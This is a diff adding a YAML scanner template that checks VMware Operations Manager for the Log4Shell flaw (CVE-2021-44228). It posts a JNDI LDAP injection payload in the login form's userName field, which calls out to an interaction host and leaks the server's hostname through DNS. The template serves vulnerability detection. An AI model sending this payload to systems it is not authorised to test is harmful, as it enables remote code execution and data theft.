@@ -1,0 +1,41 @@
+id: vmware-operation-manager-log4j-rce
+brief:
+    title: VMware Operations Manager - Remote Code Execution (Apache Log4j)
+    by: DhiyaneshDK
+    level: critical
+    about: VMware Operations Manager is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full contro...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - vmware
+        - kev
+        - oast
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/ui/login.action'
+      head:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: '{{BaseURL}}'
+        Referer: '{{BaseURL}}/ui/login.action'
+        Sec-Fetch-Dest: empty
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Site: same-origin
+        X-Requested-With: XMLHttpRequest
+      body: mainAction=login&userName=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+        - "on": word
+          has:
+            - Path=/ui
+          in: header
+          need: all
